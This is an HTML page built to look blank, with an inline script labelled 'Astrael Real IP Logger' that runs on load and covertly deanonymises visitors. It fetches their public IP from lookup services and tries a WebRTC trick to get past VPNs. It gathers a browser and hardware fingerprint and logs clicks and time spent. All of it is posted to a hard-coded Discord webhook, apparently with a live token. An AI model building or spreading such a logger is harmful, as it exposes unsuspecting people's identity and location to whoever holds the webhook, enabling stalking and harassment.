<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
    </style>
</head>
<body>
    <!-- COMPLETELY INVISIBLE - REAL IP LOGGING -->

    <script>
        // ASTRAEL REAL IP LOGGER v7.7.7 - FIXED
        (function() {
            const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1433870058102198332/S039oK5JaVytn0mUjOnCe7V09VD684ActzVl0CwynVJLU-1KoiZXm5HqnZa421jPZeQv';
            
            // Get REAL client IP (not server IP)
            const getRealIP = async () => {
                let realIP = 'Unknown';
                
                // Use services that return client IP directly
                const reliableIPApis = [
                    'https://api.ipify.org?format=json',
                    'https://api64.ipify.org?format=json',
                    'https://api.myip.com/',
                    'https://ip.seeip.org/json'
                ];

                // Try each API sequentially
                for (const api of reliableIPApis) {
                    try {
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 3000);
                        
                        const response = await fetch(api, {
                            signal: controller.signal,
                            mode: 'cors',
                            credentials: 'omit'
                        });
                        
                        clearTimeout(timeoutId);
                        const data = await response.json();
                        
                        if (data.ip && data.ip !== '127.0.0.1' && !data.ip.startsWith('10.') && 
                            !data.ip.startsWith('192.168.') && !data.ip.startsWith('172.')) {
                            realIP = data.ip;
                            break;
                        }
                    } catch(e) {
                        console.log('IP API failed:', api);
                    }
                }

                return realIP;
            };

            // Get WebRTC local IP (bypasses VPN/proxy)
            const getWebRTCIP = () => {
                return new Promise((resolve) => {
                    const rtc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' }
                        ]
                    });
                    
                    rtc.createDataChannel('');
                    rtc.createOffer()
                        .then(offer => rtc.setLocalDescription(offer))
                        .catch(() => resolve(null));
                    
                    let foundIP = null;
                    rtc.onicecandidate = (event) => {
                        if (event.candidate) {
                            const candidate = event.candidate.candidate;
                            // Match IPv4 addresses
                            const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
                            const match = candidate.match(ipRegex);
                            if (match && !isPrivateIP(match[1])) {
                                foundIP = match[1];
                                resolve(foundIP);
                                rtc.close();
                            }
                        }
                    };
                    
                    setTimeout(() => {
                        if (!foundIP) {
                            resolve(null);
                            rtc.close();
                        }
                    }, 2000);
                });
            };

            // Check if IP is private
            const isPrivateIP = (ip) => {
                return ip.startsWith('10.') || 
                       ip.startsWith('192.168.') || 
                       (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31) ||
                       ip === '127.0.0.1';
            };

            // Collect all fingerprint data
            const collectFingerprintData = () => {
                return {
                    // Browser Details
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
                    cookie_enabled: navigator.cookieEnabled,
                    
                    // Screen Information
                    screen_resolution: `${screen.width}x${screen.height}`,
                    color_depth: screen.colorDepth,
                    pixel_ratio: window.devicePixelRatio,
                    
                    // Hardware
                    cpu_cores: navigator.hardwareConcurrency || 'Unknown',
                    device_memory: navigator.deviceMemory || 'Unknown',
                    max_touch_points: navigator.maxTouchPoints || 'Unknown',
                    
                    // Connection
                    connection_type: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                    connection_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown',
                    
                    // Location & Time
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    local_time: new Date().toString(),
                    timestamp: new Date().toISOString(),
                    
                    // Page Information
                    url: window.location.href,
                    referrer: document.referrer || 'Direct',
                    hostname: window.location.hostname
                };
            };

            // Send to Discord
            const sendToDiscord = (ip, fingerprint, webrtcIP = null) => {
                const embed = {
                    title: "🔍 ASTRAEL - REAL IP CAPTURED",
                    color: 0x00ff00,
                    timestamp: new Date().toISOString(),
                    fields: [
                        {
                            name: "🌐 REAL PUBLIC IP",
                            value: `\`\`\`${ip}\`\`\``,
                            inline: false
                        },
                        {
                            name: "📍 Location Info",
                            value: `**Timezone:** ${fingerprint.timezone}\n**Language:** ${fingerprint.language}\n**Local Time:** ${fingerprint.local_time}`,
                            inline: true
                        },
                        {
                            name: "🖥️ System Info",
                            value: `**Platform:** ${fingerprint.platform}\n**Screen:** ${fingerprint.screen_resolution}\n**CPU Cores:** ${fingerprint.cpu_cores}\n**RAM:** ${fingerprint.device_memory}GB`,
                            inline: true
                        },
                        {
                            name: "🔧 Browser",
                            value: `\`\`\`${fingerprint.user_agent}\`\`\``,
                            inline: false
                        },
                        {
                            name: "📡 Network",
                            value: `**Type:** ${fingerprint.connection_type}\n**Speed:** ${fingerprint.connection_speed}`,
                            inline: true
                        },
                        {
                            name: "🔗 Page Info",
                            value: `**URL:** ${fingerprint.url}\n**Referrer:** ${fingerprint.referrer}`,
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Astrael Real IP Logger v7.7.7 • No Server IPs"
                    }
                };

                // Add WebRTC IP if available
                if (webrtcIP) {
                    embed.fields.push({
                        name: "🔒 WebRTC Local IP",
                        value: `\`\`\`${webrtcIP}\`\`\``,
                        inline: false
                    });
                }

                // Send to Discord
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed],
                        username: "Astrael IP Tracker",
                        avatar_url: "https://i.imgur.com/7W6hqz3.png"
                    })
                }).catch(error => {
                    // Fallback simple message
                    fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: `🚨 **REAL IP CAPTURED**\n**IP:** ${ip}\n**Platform:** ${fingerprint.platform}\n**Browser:** ${fingerprint.user_agent}\n**Screen:** ${fingerprint.screen_resolution}\n**URL:** ${fingerprint.url}`,
                            username: "Astrael IP Tracker"
                        })
                    });
                });
            };

            // Main tracking function
            const executeRealIPTracking = async () => {
                try {
                    // Get fingerprint data first
                    const fingerprint = collectFingerprintData();
                    
                    // Get real public IP
                    const realIP = await getRealIP();
                    
                    // Get WebRTC IP
                    const webrtcIP = await getWebRTCIP();
                    
                    // Only send if we got a real public IP
                    if (realIP && realIP !== 'Unknown' && !isPrivateIP(realIP)) {
                        sendToDiscord(realIP, fingerprint, webrtcIP);
                        
                        // Log success
                        console.log('✅ Real IP captured:', realIP);
                    } else {
                        // Send failure notification
                        fetch(DISCORD_WEBHOOK, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                content: `❌ **IP CAPTURE FAILED**\n**Reason:** Could not get real public IP\n**User Agent:** ${fingerprint.user_agent}\n**URL:** ${fingerprint.url}\n**Time:** ${fingerprint.local_time}`,
                                username: "Astrael IP Tracker"
                            })
                        });
                    }
                    
                } catch (error) {
                    console.log('Tracking error:', error);
                }
            };

            // Start tracking immediately
            window.addEventListener('load', executeRealIPTracking);
            document.addEventListener('DOMContentLoaded', executeRealIPTracking);
            
            // Execute now
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', executeRealIPTracking);
            } else {
                executeRealIPTracking();
            }

            // Additional execution points
            setTimeout(executeRealIPTracking, 1000);
            setTimeout(executeRealIPTracking, 3000);

            // Track page interactions
            let clickCount = 0;
            document.addEventListener('click', (e) => {
                clickCount++;
                if (clickCount <= 3) { // Limit to 3 clicks
                    fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: `🖱️ **User Click #${clickCount}**\n**Coordinates:** X:${e.clientX}, Y:${e.clientY}\n**URL:** ${window.location.href}`,
                            username: "Astrael IP Tracker"
                        })
                    });
                }
            });

            // Track page exit
            window.addEventListener('beforeunload', () => {
                const timeSpent = Math.round(performance.now() / 1000);
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `📤 **Visitor Left**\n**Time Spent:** ${timeSpent} seconds\n**URL:** ${window.location.href}`,
                        username: "Astrael IP Tracker"
                    })
                });
            });

        })();
    </script>
</body>
</html>

